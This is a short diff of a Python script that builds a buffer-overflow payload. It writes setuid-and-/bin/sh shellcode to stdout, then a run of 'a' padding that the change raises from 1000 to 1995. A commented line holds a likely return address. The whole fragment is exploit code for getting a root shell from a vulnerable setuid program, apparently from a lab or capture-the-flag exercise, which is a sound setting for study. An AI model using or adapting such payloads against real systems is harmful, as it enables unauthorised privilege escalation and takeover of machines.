@@ -8,7 +8,7 @@ bin_sh = (
 shellcode = setuid + bin_sh
 #print(len(shellcode))
 sys.stdout.write(shellcode)
-for i in range(1000):
+for i in range(1995):
     #shellcode += 'a'
     sys.stdout.write("a")
 #shellcode += '\xe8\xb0\xff\xbf\xfc\xb8\xff\xbf'
